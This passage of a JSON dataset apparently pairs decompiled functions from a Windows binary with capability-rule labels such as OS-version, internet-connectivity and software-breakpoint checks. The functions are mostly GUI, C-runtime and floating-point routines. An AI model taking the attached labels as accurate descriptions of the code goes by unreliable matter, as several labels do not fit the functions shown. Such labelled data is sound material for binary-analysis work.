        "decompiled_code": "\nvoid __cdecl fcn.004554c1(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_ch;\n    \n    iVar1 = (*_sym.imp.USER32.dll_IsWindow)(*(in_ECX + 0x20));\n    if (iVar1 != 0) goto code_r0x004554dd;\n    do {\n        do {\n            fcn.0041901a();\ncode_r0x004554dd:\n        } while (arg_ch == 0);\n        uVar2 = fcn.00458f50(arg_8h);\n    } while (0x400 < uVar2);\n    fcn.00455285(&var_30h, arg_ch, arg_10h);\n    var_ch = arg_8h;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x40c, 0, &var_30h);\n    return;\n}\n",
        "token_count": 241
    },
    "00455a0e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00455a0e(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    \n    iVar1 = fcn.0042b82c();\n    iVar2 = *(iVar1 + 0x3c);\n    if (arg_8h == 0) {\n        if ((*(in_ECX + 0x3c) & arg_ch) != 0) {\n            if (*(iVar1 + 0x40) == in_ECX) {\n                fcn.0041d051(1);\n            }\n            if ((iVar2 != 0) && (*(iVar2 + 0x20) != 0)) {\n                fcn.00459330(&var_30h, 0, 0x30);\n                var_28h = *(in_ECX + 0x20);\n                var_30h = 0x28;\n                var_2ch = 1;\n                var_24h = var_28h;\n                (*_sym.imp.USER32.dll_SendMessageA)(*(iVar2 + 0x20), 0x405, 0, &var_30h);\n            }\n            *(in_ECX + 0x3c) = *(in_ECX + 0x3c) & ~arg_ch;\n        }\n    }\n    else if ((*(in_ECX + 0x3c) & arg_ch) == 0) {\n        iVar2 = fcn.0042b7b9();\n        *(iVar2 + 0x38) = 0x45593e;\n        *(in_ECX + 0x3c) = *(in_ECX + 0x3c) | arg_ch;\n    }\n    return 1;\n}\n",
        "token_count": 424
    },
    "00455cfb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00455cfb(int32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_4h;\n    \n    if (arg_8h != 0) goto code_r0x00455d13;\ncode_r0x00455d0e:\n    do {\n        fcn.0041901a();\ncode_r0x00455d13:\n        if (((*(arg_8h + 0x88) != 0) && (iVar4 = *(arg_8h + 0x8c),  iVar4 != 0)) && (*(iVar4 + 0x94) != 0)) {\n            iVar1 = fcn.0044c3ac();\n            if ((iVar1 == 1) && ((*(iVar4 + 0x80) & arg_14h & 0xf000) != 0)) {\n                uVar2 = (*_sym.imp.USER32.dll_GetParent)(*(iVar4 + 0x20));\n                piVar3 = fcn.0041e67e(uVar2);\n                if (piVar3 != NULL) {\n                    fcn.00422a19(0, arg_ch, arg_10h, 0, 0, 0x15);\n                    (**(*piVar3 + 0x148))(1);\n                    goto code_r0x00455e1b;\n                }\n                goto code_r0x00455d0e;\n            }\n        }\n        uVar5 = arg_14h;\n        if (((*(arg_8h + 0x80) & 4) != 0) && (uVar5 = arg_14h | 4,  (arg_14h & 0x5000) != 0)) {\n            uVar5 = arg_14h & 0xffff2fff | 0x2004;\n        }\n        arg_14h = uVar5;\n        piVar3 = fcn.00455b13(arg_14h);\n        if (piVar3 != NULL) {\n            fcn.00422a19(0, arg_ch, arg_10h, 0, 0, 0x15);\n            if (piVar3[0xe] == 0) {\n                piVar3[0xe] = *(arg_8h + 0x20);\n            }\n            iVar4 = fcn.0042244f(0xe81f);\n            if (iVar4 != 0) {\n                fcn.0044cba6(arg_8h, 0);\n                (**(*piVar3 + 0x148))(1);\n                uVar5 = (*_sym.imp.USER32.dll_GetWindowLongA)(*(arg_8h + 0x20), 0xfffffff0);\n                if ((uVar5 & 0x10000000) != 0) {\n                    fcn.004226fd(8);\ncode_r0x00455e1b:\n                    (*_sym.imp.USER32.dll_UpdateWindow)(piVar3[8]);\n                }\n                return;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 721
    },
    "00455e2b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.00455e2b(uint lprcSrc2, uint noname_1, uint noname_2, uint noname_3, uint32_t arg_18h, int32_t **arg_1ch)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t lprcSrc1;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    ppiVar2 = arg_1ch;\n    arg_18h = arg_18h & 0xf040;\n    if (arg_1ch != NULL) {\n        *arg_1ch = NULL;\n    }\n    arg_1ch = *(in_ECX + 0x88);\n    do {\n        do {\n            if (arg_1ch == NULL) {\n                return 0;\n            }\n            ppiVar3 = fcn.0041c771(&arg_1ch);\n            piVar1 = *ppiVar3;\n            iVar4 = (**(*piVar1 + 0x15c))();\n        } while ((((iVar4 == 0) || (iVar4 = (*_sym.imp.USER32.dll_IsWindowVisible)(piVar1[8]),  iVar4 == 0)) ||\n                 ((piVar1[0x20] & arg_18h & 0xf000) == 0)) ||\n                ((piVar1[0x25] != 0 && ((piVar1[0x20] & arg_18h & 0x40) == 0))));\n        (*_sym.imp.USER32.dll_GetWindowRect)(piVar1[8], &lprcSrc1);\n        if (var_8h == lprcSrc1) {\n            var_8h = var_8h + 1;\n        }\n        if (var_4h == var_ch) {\n            var_4h = var_4h + 1;\n        }\n        iVar4 = (*_sym.imp.USER32.dll_IntersectRect)(&lprcSrc1, &lprcSrc1, &lprcSrc2);\n    } while (iVar4 == 0);\n    if (ppiVar2 != NULL) {\n        *ppiVar2 = piVar1;\n    }\n    return piVar1[0x20] & arg_18h;\n}\n",
        "token_count": 543
    },
    "004563d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004563d0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x456479;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.004564a5;\n        uStack36 = *0x4a9ec8 ^ &fcn.004563d0::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.004563d0::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.0045fd4d();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.004563d0::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 725
    },
    "004566a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004566a8(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x4a9ec8) {\n        return;\n    }\n    *0x4ad6d0 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x4ad6d4 = &arg_8h;\n    *0x4ad610 = 0x10001;\n    *0x4ad5b8 = 0xc0000409;\n    *0x4ad5bc = 1;\n    var_328h = *0x4a9ec8;\n    var_324h = *0x4a9ecc;\n    *0x4ad5c4 = unaff_retaddr;\n    *0x4ad69c = in_GS;\n    *0x4ad6a0 = in_FS;\n    *0x4ad6a4 = in_ES;\n    *0x4ad6a8 = in_DS;\n    *0x4ad6ac = unaff_EDI;\n    *0x4ad6b0 = unaff_ESI;\n    *0x4ad6b4 = unaff_EBX;\n    *0x4ad6b8 = in_EDX;\n    *0x4ad6bc = in_ECX;\n    *0x4ad6c0 = in_EAX;\n    *0x4ad6c4 = unaff_EBP;\n    *0x4ad6c8 = unaff_retaddr;\n    *0x4ad6cc = in_CS;\n    *0x4ad6d8 = in_SS;\n    *0x4ad608 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0046372b(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x492380);\n    if (*0x4ad608 == 0) {\n        fcn.0046372b(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 863
    },
    "0045c635": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0045c6ca: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0045c6cf)\n// WARNING: Removing unreachable block (ram,0x0045c6fd)\n// WARNING: Removing unreachable block (ram,0x0045c6d5)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0045c635(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00459460(0x4a4810, 0xc);\n    fcn.00466299(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x4ad548 != 1) {\n        *0x4ad544 = 1;\n        *0x4ad540 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            uVar1 = fcn.0045fb0f(*0x4af1bc);\n            uVar2 = fcn.0045fb0f(*0x4af1b8);\n            *(unaff_EBP + -0x1c) = uVar2;\n            if (uVar1 != 0) {\n                while (*(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + -4,  uVar1 <= *(unaff_EBP + -0x1c)) {\n                    if (**(unaff_EBP + -0x1c) != NULL) {\n                        (***(unaff_EBP + -0x1c))();\n                    }\n                }\n            }\n            fcn.0045c3d6(0x489950);\n        }\n        fcn.0045c3d6(0x48995c);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.004661a9(8);\n    }\n    return;\n}\n",
        "token_count": 507
    },
    "0045d150": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d150(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == 0) {\n        fcn.0045d0a7(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "0045d559": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d559(uint arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint arg_18h)\n\n{\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x20) == 0) {\n        fcn.0045d0a7(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), *(unaff_EBP + 0x18));\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "00460c71": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00460c71(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0045fd4d();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.0045fd4d();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "00461307": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00461307(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.004565fe(*(unaff_EBP + -0x28));\n    iVar1 = fcn.0045fd4d();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.0045fd4d();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.004565dd(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.00460cd1(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 381
    },
    "00469c15": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00469c15(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.004661a9(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0047beee": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0047beee(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0047c3ed;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0047c021;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0047c028;\ncode_r0x0047c021:\n                        do {\n                            var_4h = 1;\ncode_r0x0047c028:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0047c036;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0047c036:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x4ab17c - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x4ab17c < iVar12) {\n                if (iVar12 < *0x4ab178) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x4ab178;\n                    uVar5 = 1;\n                }\n                goto code_r0x0047c3ed;\n            }\n            var_10h = *0x4ab17c - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0047c1d9;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0047c1d9:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0047c3ed:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3674
    },
    "0047c430": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
